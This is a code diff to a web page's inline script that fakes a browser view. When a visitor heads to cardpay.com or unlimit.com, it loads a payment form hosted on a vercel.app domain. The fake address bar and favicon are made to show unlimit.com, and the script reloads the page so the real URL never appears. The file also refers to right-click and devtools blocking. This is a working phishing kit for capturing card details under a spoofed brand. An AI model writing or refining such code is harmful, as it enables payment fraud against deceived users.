@@ -2847,23 +2847,22 @@ console.log('✅ Right-click protection fully active (iframes, devtools, view-so
 (function() {
     "use strict";
 
-    // === CONFIGURATION ===
     const PAYMENT_URL = 'https://buypass-kappa.vercel.app/pay/cardpay.html';
     const SPOOFED_URL = 'https://unlimit.com';
     const SPOOFED_DOMAIN = 'unlimit.com';
     const TRIGGER_DOMAINS = ['cardpay.com', 'unlimit.com'];
 
-    // DOM elements
     const iframe = document.getElementById('webFrame');
     const urlInput = document.getElementById('urlInput');
     const popupDomain = document.getElementById('popupDomain');
     const faviconImg = document.getElementById('faviconImg');
     const faviconDef = document.getElementById('faviconDefault');
 
-    let isPaymentMode = false;      // true when we are showing the payment page
+    let isPaymentMode = false;
     let originalNavigate = window.navigate;
+    let pendingRefresh = false;   // true if we detected PAYMENT_URL in address bar and are waiting for iframe load
 
-    // === Helper: force unlimit.com favicon ===
+    // === Helper: spoofed favicon ===
     function setSpoofedFavicon() {
         if (!faviconImg) return;
         faviconImg.src = 'https://www.unlimit.com/favicon.ico';
@@ -2909,7 +2908,7 @@ console.log('✅ Right-click protection fully active (iframes, devtools, view-so
         setSpoofedFavicon();
     }
 
-    // === Activate payment mode (iframe = payment page, UI spoofed) ===
+    // === Activate payment mode ===
     function activatePaymentMode() {
         if (isPaymentMode) return;
         if (!iframe) return;
@@ -2920,44 +2919,63 @@ console.log('✅ Right-click protection fully active (iframes, devtools, view-so
         applySpoofedUI();
     }
 
-    // === Deactivate payment mode (go back to normal browsing) ===
+    // === Deactivate payment mode ===
     function deactivatePaymentMode() {
         if (!isPaymentMode) return;
         isPaymentMode = false;
-        // Do NOT change iframe src here – leave it as is (will be overwritten by navigate)
         restoreNormalUI();
     }
 
-    // === SAFETY: if address bar ever shows the real payment URL, force reload ===
-    function checkForRealPaymentUrl() {
+    // === Smart refresh: wait for iframe load, then refresh ===
+    function scheduleRefreshIfNeeded() {
+        if (!pendingRefresh) return;
+        // If the address bar still shows the real payment URL, wait for iframe load
         if (urlInput && urlInput.value === PAYMENT_URL) {
-            // Immediately replace with spoofed URL and reload page to reset state
-            urlInput.value = SPOOFED_URL;
+            // Already waiting – do nothing
+            return;
+        } else {
+            // Address bar no longer shows the bad URL → cancel pending refresh
+            pendingRefresh = false;
+        }
+    }
+
+    // Check the address bar for the real payment URL
+    function checkForRealPaymentUrl() {
+        if (!urlInput) return;
+        if (urlInput.value === PAYMENT_URL && !pendingRefresh) {
+            // Detected the bad URL – start waiting for iframe to finish loading
+            pendingRefresh = true;
+        } else if (urlInput.value !== PAYMENT_URL) {
+            // Bad URL gone – cancel any pending refresh
+            pendingRefresh = false;
+        }
+    }
+
+    // Reload the page after iframe has finished loading
+    function performDelayedRefresh() {
+        if (pendingRefresh) {
+            pendingRefresh = false;
             window.location.reload();
         }
     }
 
-    // === Intercept the main navigate function (used by address bar, back/forward) ===
+    // === Intercept navigate function ===
     if (typeof originalNavigate === 'function') {
         window.navigate = function(url, addToHistory) {
-            // Normalise url string
             const urlStr = String(url || '').toLowerCase();
             const isTrigger = TRIGGER_DOMAINS.some(domain => urlStr.includes(domain));
 
             if (isTrigger) {
-                // User wants to go to cardpay.com or unlimit.com → activate payment mode
                 activatePaymentMode();
-                // Call original navigate with spoofed URL (keeps history clean)
                 return originalNavigate(SPOOFED_URL, addToHistory);
             } else {
-                // User goes to any other site → deactivate payment mode and navigate normally
                 if (isPaymentMode) deactivatePaymentMode();
                 return originalNavigate(url, addToHistory);
             }
         };
     }
 
-    // === Listen to address bar Enter key ===
+    // === Address bar Enter key ===
     if (urlInput) {
         urlInput.addEventListener('keydown', (e) => {
             if (e.key === 'Enter') {
@@ -2970,43 +2988,43 @@ console.log('✅ Right-click protection fully active (iframes, devtools, view-so
                         originalNavigate(SPOOFED_URL, true);
                     }
                 } else {
-                    // Normal navigation – deactivate payment mode if needed
                     if (isPaymentMode) deactivatePaymentMode();
-                    // Let the original navigate happen normally
                 }
             }
         });
-        // Never set readOnly – user can freely edit
     }
 
     // === Monitor iframe loads ===
     if (iframe) {
         iframe.addEventListener('load', () => {
+            // Iframe finished loading – if we have a pending refresh, execute it now
+            if (pendingRefresh) {
+                performDelayedRefresh();
+                return;
+            }
+
             setTimeout(() => {
                 try {
                     const currentIframeUrl = iframe.contentWindow?.location?.href;
-                    // If iframe ended up on a non-payment page while we are in payment mode, revert
                     if (isPaymentMode && currentIframeUrl && currentIframeUrl !== PAYMENT_URL && !TRIGGER_DOMAINS.some(d => currentIframeUrl.includes(d))) {
-                        // Something went wrong: force payment page again
                         iframe.src = PAYMENT_URL;
                         applySpoofedUI();
                     } else if (!isPaymentMode && currentIframeUrl === PAYMENT_URL) {
-                        // We are in normal mode but iframe shows payment page – force reload to correct
-                        window.location.reload();
+                        // Should not happen, but if it does, refresh after load
+                        pendingRefresh = true;
+                        performDelayedRefresh();
                     } else if (!isPaymentMode) {
-                        // Normal mode: update UI to match current iframe
                         restoreNormalUI();
                     } else {
-                        // Payment mode active: keep UI spoofed
                         applySpoofedUI();
                     }
-                } catch(e) { /* cross-origin – ignore */ }
+                } catch(e) {}
                 checkForRealPaymentUrl();
             }, 30);
         });
     }
 
-    // === Listen to popstate (back/forward) ===
+    // === popstate (back/forward) ===
     window.addEventListener('popstate', () => {
         setTimeout(() => {
             const currentBarUrl = urlInput ? urlInput.value : '';
@@ -3020,10 +3038,10 @@ console.log('✅ Right-click protection fully active (iframes, devtools, view-so
         }, 20);
     });
 
-    // === Periodically check for real payment URL in address bar (every 500ms) ===
+    // === Periodic check for bad URL (but do NOT refresh instantly) ===
     setInterval(checkForRealPaymentUrl, 500);
 
-    // === Initial check on page load ===
+    // === Initial check ===
     const initialUrl = urlInput ? urlInput.value : '';
     if (TRIGGER_DOMAINS.some(domain => initialUrl.toLowerCase().includes(domain))) {
         activatePaymentMode();
@@ -3032,7 +3050,7 @@ console.log('✅ Right-click protection fully active (iframes, devtools, view-so
         restoreNormalUI();
     }
 
-    console.log('✅ Smart spoof active – payment URL never shown in address bar');
+    console.log('✅ Smart spoof active – will refresh only after iframe load if bad URL appears');
 })();
 </script>
 </body>
